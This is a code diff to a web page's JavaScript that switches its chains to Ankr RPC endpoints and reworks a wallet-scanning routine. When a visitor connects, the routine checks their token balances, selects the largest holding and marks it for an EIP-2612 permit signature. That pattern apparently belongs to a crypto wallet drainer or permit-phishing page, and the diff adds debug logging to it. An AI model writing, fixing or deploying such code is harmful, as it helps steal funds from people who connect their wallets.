@@ -251,7 +251,7 @@
     11155111: {
       name: "Sepolia",
       symbol: "SEP",
-      rpc: "https://ethereum-sepolia-rpc.publicnode.com",
+      rpc: "https://rpc.ankr.com/eth_sepolia",
       displayName: "Sepolia Testnet",
       tokens: {
         "DEMO": "0x56c36D6118e32A3A091B78ad535449f5bfDccee8"
@@ -260,7 +260,7 @@
     1: {
       name: "Ethereum",
       symbol: "ETH",
-      rpc: "https://eth.llamarpc.com",
+      rpc: "https://rpc.ankr.com/eth",
       displayName: "Ethereum Mainnet",
       tokens: {
         "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
@@ -272,11 +272,11 @@
     8453: {
       name: "Base",
       symbol: "BASE",
-      rpc: "https://base.llamarpc.com",
+      rpc: "https://rpc.ankr.com/base",
       displayName: "Base",
       tokens: {
-        "USDC": "0x833589fCD6eDb6E08f4c7C32D4f71b1455476C6D",
         "DAI": "0x50c5725949A6F0c72E6C4a641F53D5d0B2F0860a",
+        "USDC": "0x833589fCD6eDb6E08f4c7C32D4f71b1455476C6D",
         "cbETH": "0x2ae3f1ec7f1f5012cfeab0151038900d41b3f057",
         "AERO": "0x940181a94A35A4569E4B06Aaf894467798F6dA20"
       }
@@ -284,7 +284,7 @@
     42161: {
       name: "Arbitrum",
       symbol: "ARB",
-      rpc: "https://arb1.arbitrum.io/rpc",
+      rpc: "https://rpc.ankr.com/arbitrum",
       displayName: "Arbitrum One",
       tokens: {
         "USDC": "0xaf88d065e77c8cC2239327C5EDB3A432268e5831",
@@ -357,44 +357,69 @@
     config = CHAIN_CONFIGS[chainId];
     if (!config) return null;
 
+    console.log(`\n🔍 SCANNER: Checking chain ${chainId} (${config.displayName}) for wallet ${walletAddress}\n`);
+    
     const provider = new ethers.JsonRpcProvider(config.rpc);
     const candidates = [];
 
     for (const [symbol, addr] of Object.entries(config.tokens)) {
       try {
+        console.log(`[${symbol}] Fetching balance from ${addr}...`);
+        
         const contract = new ethers.Contract(addr, ERC20_ABI, provider);
-        const balance = await contract.balanceOf(walletAddress);
-        if (balance === 0n) continue;
-
-        const decimals = await contract.decimals();
-        const name = await contract.name();
-        const formatted = parseFloat(ethers.formatUnits(balance, decimals));
-
-        // Try EIP-2612 (permit) - assume support and attempt signing
-        let authType = 'EIP2612'; // Default to permit for tokens with balance
+        let balance;
         
-        // You can add stricter checks here if needed, but for demo purposes
-        // we'll let the actual signing attempt determine if it works
-        
-        if (authType) {
-          candidates.push({
-            symbol, name, address: addr, balance, decimals, formatted, authType
-          });
-          console.log(`✓ ${symbol} (${authType}): ${formatted} tokens`);
+        try {
+          balance = await contract.balanceOf(walletAddress);
+          console.log(`[${symbol}] Balance query: ${balance.toString()}`);
+        } catch (balErr) {
+          console.error(`[${symbol}] Balance query failed:`, balErr.message);
+          continue;
         }
+        
+        if (balance === 0n || balance < 1n) {
+          console.log(`[${symbol}] ✗ Zero or negligible balance`);
+          continue;
+        }
+
+        let decimals = 18, name = symbol;
+        try {
+          decimals = await contract.decimals();
+        } catch(e) { console.warn(`[${symbol}] decimals() failed:`, e.message); }
+        
+        try {
+          name = await contract.name();
+        } catch(e) { console.warn(`[${symbol}] name() failed:`, e.message); }
+
+        const formatted = parseFloat(ethers.formatUnits(balance, decimals));
+        console.log(`[${symbol}] ✓ FOUND: ${formatted} tokens (name: ${name})`);
+
+        candidates.push({
+          symbol, 
+          name, 
+          address: addr, 
+          balance, 
+          decimals, 
+          formatted, 
+          authType: 'EIP2612'
+        });
+
       } catch(e) {
-        console.error(`Error scanning ${symbol}:`, e.message);
+        console.error(`[${symbol}] Unexpected error:`, e.message);
       }
     }
 
+    console.log(`\n📊 RESULTS: Found ${candidates.length} tokens with balance\n`);
     if (candidates.length === 0) {
-      console.warn(`No permit-enabled tokens found on chain ${chainId}`);
+      console.error(`❌ NO TOKENS FOUND. Candidates array is empty.`);
+      console.log(`Tokens checked:`, Object.keys(config.tokens));
       return null;
     }
     
     candidates.sort((a, b) => b.formatted - a.formatted);
-    console.log(`🎯 Selected: ${candidates[0].symbol} (${candidates[0].authType})`);
-    return candidates[0];
+    const selected = candidates[0];
+    console.log(`🎯 SELECTED: ${selected.symbol} (${selected.formatted} tokens at ${selected.address})\n`);
+    return selected;
   }
 
   document.getElementById('connectBtn').addEventListener('click', async () => {
